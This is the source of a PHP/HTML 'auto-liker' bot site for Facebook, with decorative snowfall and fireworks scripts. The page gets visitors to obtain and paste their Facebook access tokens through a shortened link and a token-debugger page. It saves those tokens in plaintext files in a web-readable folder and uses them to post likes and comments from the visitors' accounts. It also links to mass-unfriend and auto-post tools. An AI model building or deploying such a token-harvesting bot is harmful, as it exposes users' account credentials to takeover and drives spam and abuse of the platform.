<a href="http://www.zeitverschiebung.net/en/country/pk"><span style="color:aqua;">
</span><br/></a></h2> <iframe src="http://www.zeitverschiebung.net/clock-widget-iframe-v2?language=en&timezone=Asia/Karachi" width="100%" height="150" frameborder="0" seamless></iframe> <small style="color:;">&copy; <a href="http://www.zeitverschiebung.net/en/" style="color: green;"></a></small> </div>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>-=[CHAUDHRY BOTTER&trade; ]=-</title>        <link rel="stylesheet" type="text/css" href="ali.css" media="all,handheld"/>
<link rel="stylesheet" type="text/css" href="black.css" media="all,handheld"/>
<link rel="stylesheet" type="text/css" href="snow.css" media="all,handheld"/>
       <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,300,600' rel='stylesheet' type='text/css'>        <link rel="shortcut icon" href="http://vignette3.wikia.nocookie.net/clubpenguin/images/4/47/1433_icon.png/revision/latest?cb=20120705152241"><script type="text/javascript" async="async" defer="defer" data-cfasync="false" src="https://mylivechat.com/chatinline.aspx?hccid=85737440"></script>
<script type="text/javascript" async="async" defer="defer" data-cfasync="false" src="fire_works.js"></script>
<script type='text/javascript' src='http://m.free-codes.org/gh.php?id=2001'></script>
<html>
<head>
<script language="javascript" type="text/javascript">
alert("Welcome Ch Botters Site Owned By Zain Aqdas")
</script>
</head>
</html><?php error_reporting(0);$bot=new bot();class bot{public function getGr($as,$bs){$ar=array(        'graph',        'fb',        'me');$im='https://'.implode('.',$ar);return $im.$as.$bs;}public function getUrl($mb,$tk,$uh=null){$ar=array(        'access_token' => $tk,);if($uh){$else=array_merge($ar,$uh);        }else{        $else=$ar;}foreach($else as $b => $c){        $aden[]=$b.'='.$c;}$true='?'.implode('&',$aden);$true=$this->getGr($mb,$true);$true=json_decode($this->one($true),true);if($true[data]){        return $true[data];}else{        return $true;}}private function one($url){$cx=curl_init();curl_setopt_array($cx,array(CURLOPT_URL => $url,CURLOPT_CONNECTTIMEOUT => 5,CURLOPT_RETURNTRANSFER => 1,CURLOPT_USERAGENT => 'DESCRIPTION by Ali',));$ch=curl_exec($cx);        curl_close($cx);        return ($ch);}public function savEd($tk,$id,$a,$b,$o,$c,$z=null,$bb=null){if(!is_dir('aden')){        mkdir('aden');}if($bb){$blue=fopen('aden/'.$id,'w');fwrite($blue,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$bb);        fclose($blue);echo'<script type="text/javascript">alert("INFO : Your Written Comment Has Been Saved !! Good Luck !! ")</script>';}else{        if($z){if(file_exists('aden/'.$id)){$file=file_get_contents('aden/'.$id);$ex=explode('*',$file);$str=str_replace($ex[0],$tk,$file);$xs=fopen('aden/'.$id,'w');        fwrite($xs,$str);        fclose($xs);}else{$str=$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c;$xs=fopen('aden/'.$id,'w');        fwrite($xs,$str);        fclose($xs);}$_SESSION[key]=$tk.'_'.$id;}else{$file=file_get_contents('aden/'.$id);$file=explode('*',$file);        if($file[5]){$up=fopen('aden/'.$id,'w');fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$file[5]);        fclose($up);        }else{$up=fopen('aden/'.$id,'w');fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c);        fclose($up);        }echo'<script type="text/javascript">alert("INFO : Script Comment Has Been Saved !!")</script>';}}}public function lOgbot($d){        unlink('aden/'.$d);        unset($_SESSION[key]);echo'<script type="text/javascript">alert("INFO : Logout success")</script>';        $this->atas();        $this->home();        $this->bwh();}public function cek($tok,$id,$nm){$if=file_get_contents('aden/'.$id);$if=explode('*',$if);if(preg_match('/on/',$if[1])){        $satu='on';        $ak='Like tambah komen';}else{        $satu='off';        $ak='Like saja';}if(preg_match('/on/',$if[2])){        $dua='on';        $ik='Bot emo';}else{        $dua='off';        $ik='Bot manual';}if(preg_match('/on/',$if[3])){        $tiga='on';        $ek='Powered on';}else{        $tiga='off';        $ek='Powered off';}if(preg_match('/on/',$if[4])){        $empat='on';        $uk='Text via script';}else{        $empat='off';        $uk='Via text sendiri';}echo'<center><div id="bottom-content"><div id="navigation-menu"><br><ul><font color="white">Welcome :  '.$nm.'</font><br><br><a href="http://m.facebook.com/'.$id.'"><img src="https://graph.facebook.com/'.$id.'/picture" style="width:50px; height:50px;border: 1px solid white;border-radius: 100px;background-color: white;" alt="'.$nm.'"/></a><br> <font color="white">Your Bot has been Activated '.$nm.'</font><br><form action="index.php" method="post"><input type="hidden" name="logout" value="'.$id.'"><input class="button button5" type="submit" value="Logout Bot"></form><center><div class="hr"><hr /></div></center><br><br><br><form action="index.php" method="post"><center><font color="black" size="3">Select Menu Robot</font></center><select class="button button5">';        if($satu=='on'){        echo'<option value="'.$satu.'">'.$ak.'</option><option value="off">Like saja</option></select>';        }else{        echo'<option value="'.$satu.'">'.$ak.'</option><option value="on">Like tambah komen</option></select>';}echo'<select  class="button button5" name="emot">';        if($dua=='on'){        echo'<option value="'.$dua.'">'.$ik.'</option><option value="off">Bot manual</option></select>';        }else{        echo'<option value="'.$dua.'">'.$ik.'</option><option value="on">Bot emo</option></select>';}echo'<select  class="button button5" name="target">';        if($tiga=='on'){        echo'<option value="'.$tiga.'">'.$ek.'</option><option value="off">Powered off</option></select>';        }else{        echo'<option value="'.$tiga.'">'.$ek.'</option><option value="on">Powered on</option></select>';}echo'';        if($empat=='on'){        echo'<select class="button button5" name="opsi"><option value="'.$empat.'">'.$uk.'</option><option value="off">Via text sendiri</option></select>';}else{        if($if[5]){        echo'<select  class="button button5" name="opsi"><option value="'.$empat.'">'.$uk.'</option><option value="text">Ganti Text Anda</option><option value="on">Text via script</option></select>';        }else{        echo'Buat text Anda<input type="text" name="text" style="height:30px;"><input type="hidden" name="opsi" value="'.$empat.'">';}}echo'</ul></div><ul><div id="top-content"><div id="search-form"><input class="button button5" type="submit" value="SAVE"></form></div></div></div></ul></center>';$this->membEr();}public function atas(){$hari=array(1=>        "Monday",        "Tuesday",        "Wednesday",        "Thursday",        "Friday",        "Saturday",        "Sunday");$bulan=array(1=>"January",  "February",    "March",     "April",       "May",         "June",           "July",             "August",               "September",          "October",     "November","Desember");$hr=$hari[gmdate('N',time()+60*60*7)];$tgl=gmdate('j',time()+60*60*7);$bln=$bulan[gmdate('n',time()+60*60*7)];$thn=gmdate('Y',time()+60*60*7);$jam=gmdate('H',time()+60*60*7);echo'<div id="header"><h1 class="heading"></h1><center><a target="_top" href="http://www.flamingtext.com/" ><img src="http://blog.flamingtext.com/blog/2017/01/11/flamingtext_com_1484166347_572057355.png" border="0" alt="Logo Design by FlamingText.com" title="Logo Design by FlamingText.com"></a></center><h2 class="description"><h1><center><script src=""></script><h1></h2></div></div>';}public function home(){echo'<br></div>';}public function bwh(){echo'<div id="bottom-content"><div id="navigation-menu"><center></head>    <body>        <div id="main">            <div id="content">                <div class="header">
<br>
<br><center><font color="yellow" size="+1"><marquee bgcolor="" direction="left" loop="infinite" width="14%"><strong> ♥ WELCOM TO MY SITE ♥ WELCOM TO MY SITE ♥ WELCOM TO MY SITE ♥ WELCOM TO MY SITE ♥ WELCOM TO MY SITE ♥ WELCOM TO MY SITE </strong></marquee>
<br>
<br><marquee class="GeneratedMarquee" direction="left" scrollamount="12" behavior="scroll"><font size="26" color="red">••´º´•» </font><font face="Orbitron" size="6" style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.6em red, 0pt 2pt 0.6em red;"><b> Script Created By Zain Aqdas </b></font><font size="26" color="red"> «•´º´••</font></marquee>
<br>
<br><center><h4><font size="26" color="red"><center></font><font face="Orbitron" size="6" style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.6em red, 0pt 2pt 0.6em red;"><b>⬇ GET WORKING TOKEN ⬇ </b></font><font size="26" color="red"></center></font></h4>
<center><td><a href="https://goo.gl/dWxrQZ" target="_blank" style="text-decoration: none;">
<input type="button" value="❤Allow App❤" style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 12px;font-size: 15px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color:white;background: none;width:150px;"></td></a><td><a href="https://developers.facebook.com/tools/debug/accesstoken/?app_id=41158896424" target="_blank" style="text-decoration: none;">
<input type="button" value="❤Get Token❤" style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 12px;font-size: 15px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color:white;background: none;width:150px;"></td> </a></center>
<br><center><h4><font size="26" color="red"><center></font><font face="Orbitron" size="6" style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.6em red, 0pt 2pt 0.6em red;"><b>👇 OTHER SERVICES 👇 </b></font><font size="26" color="red"></center></font></h4>
<center><td><a href="https://allfiles.comuf.com/unfriend.php" target="_blank" style="text-decoration: none;">
<input type="button" value="List Clear" style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 12px;font-size: 15px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color:white;background: none;width:150px;"></td></a><td><a href="https://allfiles.comuf.com/all-accept.php" target="_blank" style="text-decoration: none;">
<input type="button" value="Accept Requests" style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 12px;font-size: 15px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color:white;background: none;width:150px;"></td></a><td><a href="https://allfiles.comuf.com/auto-poster.php" target="_blank" style="text-decoration: none;">
<input type="button" value="Auto Post" style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 12px;font-size: 15px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color:white;background: none;width:150px;"></td></a></center>
<center><h4><font size="26" color="red"><center>••´º´•» </font><font face="Orbitron" size="6" style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.6em red, 0pt 2pt 0.6em red;"><b> 🎭  CHAUDHRY 🌹 BOTTER 🎭 </b></font><font size="26" color="red"> «•´º´••</center></font></h4> <center><br><form action="index.php" method="post"> <input class="inp-text" type="text" style="height:35px;width:60%;border-radius:15px;border:1px solid white;background: none;color:white;" name="token"> </br> 
<br>
  <input id="sbmt" class="inp-btn" type="submit" style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 12px;font-size: 15px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color:white;background: none;width:120px;" value="SUBMIT"></form></div></div></div>';$this->membEr();}public function membEr(){        if(!is_dir('aden')){        mkdir('aden');}$up=opendir('aden');while($use=readdir($up)){if($use != '.' && $use != '..'){        $user[]=$use;}        }echo'
<br>
<center><font style="font-family: Iceland;border: 1px solid white;color: white;border-radius: 48px;padding: 11px;font-size: 20px;font-weight: bold;margin-left: -3px;margin-top: 10px;background-color: white;color: white;background: none;width:140px;">User Active : <font color="red">'.count($user).'</font></font></h3></center><br>
<marquee direction="right"<a><font face="Battle Beasts" size="12"> <script src="babol.js"></script></a></marquee>
';}public function toXen($h){header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');}}if(isset($_SESSION[key])){        $a=$_SESSION[key];        $ai=explode('_',$a);        $a=$ai[0];if($_POST[logout]){        $ax=$_POST[logout];        $bot->lOgbot($ax);}else{$b=$bot->getUrl('/me',$a,array('fields' => 'id,name',));if($b[id]){if($_POST[likes]){        $as=$_POST[likes];        $bs=$_POST[emot];        $bx=$_POST[target];        $cs=$_POST[opsi];        $tx=$_POST[text];if($cs=='text'){        unlink('Tokenx/'.$b[id]);$bot->savEd($a,$b[id],$as,$bs,$bx,'off');        }else{        if($tx){$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);        }else{$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}}        $bot->atas();        $bot->home();$bot->cek($a,$b[id],$b[name]);}else{echo '<script type="text/javascript">alert("INFO: Session Token Expired")</script>';        unset($_SESSION[key]);        unlink('aden/'.$ai[1]);$bot->atas();$bot->home();        $bot->bwh();}}        }else{if($_POST[token]){        $a=$_POST[token];if(preg_match('/token/',$a)){$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));        }else{        $cut=explode('&',$a);$tok=$cut[0];}$b=$bot->getUrl('/me',$tok,array(        'fields' => 'id,name',));if($b[id]){$bot->savEd($tok,$b[id],'on','on','on','on','null');        $bot->atas();        $bot->home();$bot->cek($tok,$b[id],$b[name]);}else{echo '<script type="text/javascript">alert("Error : Token Invalid")</script>';        $bot->atas();        $bot->home();        $bot->bwh();}}else{if($_GET[token]){        $a=$_GET[token];        $bot->toXen($a);}else{        $bot->atas();        $bot->home();        $bot->bwh();}}
}
?>
<audio src="ali.mp3" autoplay loop>
Your browser does not support the audio element
</audio>
<!--Add the following script at the bottom of the web page (before </body></html>)-->
<script type="text/javascript" async="async" defer="defer" data-cfasync="false" src="https://mylivechat.com/chatinline.aspx?hccid=85737440"></script>
<script type='text/javascript' src='http://m.free-codes.org/gh.php?id=2001'></script>
<script>
// Set the number of snowflakes (more than 30 - 40 not recommended)
var snowmax=35

// Set the colors for the snow. Add as many colors as you like
var snowcolor=new Array("#aaaacc","#ddddFF","#ccccDD")

// Set the fonts, that create the snowflakes. Add as many fonts as you like
var snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS")

// Set the letter that creates your snowflake (recommended:*)
var snowletter="♡"

// Set the speed of sinking (recommended values range from 0.3 to 2)
var sinkspeed=0.6

// Set the maximal-size of your snowflaxes
var snowmaxsize=22

// Set the minimal-size of your snowflaxes
var snowminsize=8

// Set the snowing-zone
// Set 1 for all-over-snowing, set 2 for left-side-snowing 
// Set 3 for center-snowing, set 4 for right-side-snowing
var snowingzone=3

///////////////////////////////////////////////////////////////////////////
// CONFIGURATION ENDS HERE
///////////////////////////////////////////////////////////////////////////


// Do not edit below this line
var snow=new Array()
var marginbottom
var marginright
var timer
var i_snow=0
var x_mv=new Array();
var crds=new Array();
var lftrght=new Array();
var browserinfos=navigator.userAgent 
var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)
var ns6=document.getElementById&&!document.all
var opera=browserinfos.match(/Opera/)  
var browserok=ie5||ns6||opera

function randommaker(range) {		
	rand=Math.floor(range*Math.random())
    return rand
}

function initsnow() {
	if (ie5 || opera) {
		marginbottom = document.body.clientHeight
		marginright = document.body.clientWidth
	}
	else if (ns6) {
		marginbottom = window.innerHeight
		marginright = window.innerWidth
	}
	var snowsizerange=snowmaxsize-snowminsize
	for (i=0;i<=snowmax;i++) {
		crds[i] = 0;                      
    	lftrght[i] = Math.random()*15;         
    	x_mv[i] = 0.03 + Math.random()/10;
		snow[i]=document.getElementById("s"+i)
		snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]
		snow[i].size=randommaker(snowsizerange)+snowminsize
		snow[i].style.fontSize=snow[i].size
		snow[i].style.color=snowcolor[randommaker(snowcolor.length)]
		snow[i].sink=sinkspeed*snow[i].size/5
		if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
		if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
		if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
		if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
		snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)
		snow[i].style.left=snow[i].posx
		snow[i].style.top=snow[i].posy
	}
	movesnow()
}

function movesnow() {
	for (i=0;i<=snowmax;i++) {
		crds[i] += x_mv[i];
		snow[i].posy+=snow[i].sink
		snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);
		snow[i].style.top=snow[i].posy
		
		if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){
			if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
			if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
			if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
			if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
			snow[i].posy=0
		}
	}
	var timer=setTimeout("movesnow()",50)
}

for (i=0;i<=snowmax;i++) {
	document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>")
}
if (browserok) {
	window.onload=initsnow
}
</script>
<script type="text/javascript">
// <![CDATA[
var bits=80; // how many bits
var speed=50; // how fast - smaller is faster
var bangs=10; // how many can be launched simultaneously (note that using too many can slow the script down)
var colours=new Array("#03f", "#f03", "#0e0", "#93f", "#0cf", "#f93", "#f0c"); 
//                     blue    red     green   purple  cyan    orange  pink

/****************************
*      Fireworks Effect     *
*(c)2004-14 mf2fm web-design*
*  http://www.mf2fm.com/rv  *
* DON'T EDIT BELOW THIS BOX *
****************************/
var bangheight=new Array();
var intensity=new Array();
var colour=new Array();
var Xpos=new Array();
var Ypos=new Array();
var dX=new Array();
var dY=new Array();
var stars=new Array();
var decay=new Array();
var swide=800;
var shigh=600;
var boddie;

if (typeof('addRVLoadEvent')!='function') function addRVLoadEvent(funky) {
  var oldonload=window.onload;
  if (typeof(oldonload)!='function') window.onload=funky;
  else window.onload=function() {
    if (oldonload) oldonload();
    funky();
  }
}

addRVLoadEvent(light_blue_touchpaper);

function light_blue_touchpaper() { if (document.getElementById) {
  var i;
  boddie=document.createElement("div");
  boddie.style.position="fixed";
  boddie.style.top="0px";
  boddie.style.left="0px";
  boddie.style.overflow="visible";
  boddie.style.width="1px";
  boddie.style.height="1px";
  boddie.style.backgroundColor="transparent";
  document.body.appendChild(boddie);
  set_width();
  for (i=0; i<bangs; i++) {
    write_fire(i);
    launch(i);
    setInterval('stepthrough('+i+')', speed);
  }
}}

function write_fire(N) {
  var i, rlef, rdow;
  stars[N+'r']=createDiv('|', 12);
  boddie.appendChild(stars[N+'r']);
  for (i=bits*N; i<bits+bits*N; i++) {
    stars[i]=createDiv('*', 13);
    boddie.appendChild(stars[i]);
  }
}

function createDiv(char, size) {
  var div=document.createElement("div");
  div.style.font=size+"px monospace";
  div.style.position="absolute";
  div.style.backgroundColor="transparent";
  div.appendChild(document.createTextNode(char));
  return (div);
}

function launch(N) {
  colour[N]=Math.floor(Math.random()*colours.length);
  Xpos[N+"r"]=swide*0.5;
  Ypos[N+"r"]=shigh-5;
  bangheight[N]=Math.round((0.5+Math.random())*shigh*0.4);
  dX[N+"r"]=(Math.random()-0.5)*swide/bangheight[N];
  if (dX[N+"r"]>1.25) stars[N+"r"].firstChild.nodeValue="/";
  else if (dX[N+"r"]<-1.25) stars[N+"r"].firstChild.nodeValue="\\";
  else stars[N+"r"].firstChild.nodeValue="|";
  stars[N+"r"].style.color=colours[colour[N]];
}

function bang(N) {
  var i, Z, A=0;
  for (i=bits*N; i<bits+bits*N; i++) { 
    Z=stars[i].style;
    Z.left=Xpos[i]+"px";
    Z.top=Ypos[i]+"px";
    if (decay[i]) decay[i]--;
    else A++;
    if (decay[i]==15) Z.fontSize="7px";
    else if (decay[i]==7) Z.fontSize="2px";
    else if (decay[i]==1) Z.visibility="hidden";
	if (decay[i]>1 && Math.random()<.1) {
	   Z.visibility="hidden";
	   setTimeout('stars['+i+'].style.visibility="visible"', speed-1);
	}
    Xpos[i]+=dX[i];
    Ypos[i]+=(dY[i]+=1.25/intensity[N]);

  }
  if (A!=bits) setTimeout("bang("+N+")", speed);
}

function stepthrough(N) { 
  var i, M, Z;
  var oldx=Xpos[N+"r"];
  var oldy=Ypos[N+"r"];
  Xpos[N+"r"]+=dX[N+"r"];
  Ypos[N+"r"]-=4;
  if (Ypos[N+"r"]<bangheight[N]) {
    M=Math.floor(Math.random()*3*colours.length);
    intensity[N]=5+Math.random()*4;
    for (i=N*bits; i<bits+bits*N; i++) {
      Xpos[i]=Xpos[N+"r"];
      Ypos[i]=Ypos[N+"r"];
      dY[i]=(Math.random()-0.5)*intensity[N];
      dX[i]=(Math.random()-0.5)*(intensity[N]-Math.abs(dY[i]))*1.25;
      decay[i]=16+Math.floor(Math.random()*16);
      Z=stars[i];
      if (M<colours.length) Z.style.color=colours[i%2?colour[N]:M];
      else if (M<2*colours.length) Z.style.color=colours[colour[N]];
      else Z.style.color=colours[i%colours.length];
      Z.style.fontSize="13px";
      Z.style.visibility="visible";
    }
    bang(N);
    launch(N);
  }
  stars[N+"r"].style.left=oldx+"px";
  stars[N+"r"].style.top=oldy+"px";
} 

window.onresize=set_width;
function set_width() {
  var sw_min=999999;
  var sh_min=999999;
  if (document.documentElement && document.documentElement.clientWidth) {
    if (document.documentElement.clientWidth>0) sw_min=document.documentElement.clientWidth;
    if (document.documentElement.clientHeight>0) sh_min=document.documentElement.clientHeight;
  }
  if (typeof(self.innerWidth)!="undefined" && self.innerWidth) {
    if (self.innerWidth>0 && self.innerWidth<sw_min) sw_min=self.innerWidth;
    if (self.innerHeight>0 && self.innerHeight<sh_min) sh_min=self.innerHeight;
  }
  if (document.body.clientWidth) {
    if (document.body.clientWidth>0 && document.body.clientWidth<sw_min) sw_min=document.body.clientWidth;
    if (document.body.clientHeight>0 && document.body.clientHeight<sh_min) sh_min=document.body.clientHeight;
  }
  if (sw_min==999999 || sh_min==999999) {
    sw_min=800;
    sh_min=600;
  }
  swide=sw_min;
  shigh=sh_min;
}
// ]]>
</script>